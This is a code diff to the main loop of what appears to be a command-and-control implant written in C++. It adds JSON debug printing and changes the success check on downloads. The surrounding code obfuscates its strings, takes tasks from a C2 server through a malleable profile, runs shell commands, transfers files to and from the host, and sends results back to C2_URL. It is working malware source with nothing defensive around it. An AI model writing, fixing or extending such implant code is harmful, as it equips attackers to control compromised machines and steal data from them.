@@ -27,6 +27,46 @@ using namespace andrivet::ADVobfuscator;
 
 MalleableProfile *currentProfile;
 
+void PrintJsonType(const rapidjson::GenericValue<rapidjson::UTF8<>> *json)
+{
+	if (json->IsObject())
+	{
+		DEBUG_PRINTF("JSON is object\n");
+
+		for (rapidjson::Value::ConstMemberIterator itr = json->MemberBegin(); itr != json->MemberEnd(); ++itr)
+		{
+			DEBUG_PRINTF("Key: %s\n", itr->name.GetString());
+			PrintJsonType(&itr->value);
+		}
+
+	} else if (json->IsArray())
+	{
+		DEBUG_PRINTF("JSON is array\n");
+		for (rapidjson::SizeType i = 0; i < json->Size(); i++)
+		{
+			PrintJsonType(&(*json)[i]);
+		}
+	} else if (json->IsString())
+	{
+		DEBUG_PRINTF("JSON is string: %s\n", json->GetString());
+	} else if (json->IsInt())
+	{
+		DEBUG_PRINTF("JSON is int: %d\n", json->GetInt());
+	} else if (json->IsBool())
+	{
+		DEBUG_PRINTF("JSON is bool: %d\n", json->GetBool());
+	} else if (json->IsNull())
+	{
+		DEBUG_PRINTF("JSON is null\n");
+	} else if (json->IsDouble())
+	{
+		DEBUG_PRINTF("JSON is double: %f\n", json->GetDouble());
+	} else
+	{
+		DEBUG_PRINTF("JSON is unknown\n");
+	}
+}
+
 int main()
 {
 	if (sodium_init() < 0)
@@ -82,6 +122,9 @@ int main()
 		int opcode = newTask->opcode;
 		bool success = false;
 		DEBUG_PRINTF("Opcode: %d\n", opcode);
+		
+		PrintJsonType(newTask->args);
+
 		if (opcode == OPCODE_CMD)
 		{
 			HandleCmd(newTask, currentProfile);
@@ -117,12 +160,20 @@ int main()
 		}
 		else if (opcode == OPCODE_DOWNLOAD) {
 			std::string result = Download(newTask->args->GetString());
-			SendTaskResult(newTask->taskId.c_str(), C2_URL, result, result != OBFUSCATED("ERROR"), currentProfile);
+			// see if `ERROR` is the start of the string, very hacky
+			success = result.compare(0, 5, OBFUSCATED("ERROR")) != 0;
+			SendTaskResult(newTask->taskId.c_str(), C2_URL, result, success, currentProfile);
 		}
 		else if (opcode == OPCODE_UPLOAD) {
+			// Print type of args
+			rapidjson::Type argsType = newTask->args->GetType();
+			DEBUG_PRINTF("Args type: %d\n", argsType);
+
+			// Get array of args
 			rapidjson::GenericArray<false, rapidjson::Value> arr = newTask->args->GetArray();
 			std::string fileName = arr[0].GetString();
 			std::string b64content = arr[1].GetString();
+			DEBUG_PRINTF("Uploading %s\n", fileName.c_str());
 			std::string result = Upload(fileName, b64content);
 			SendTaskResult(newTask->taskId.c_str(), C2_URL, result, result != OBFUSCATED("ERROR"), currentProfile);
 		}
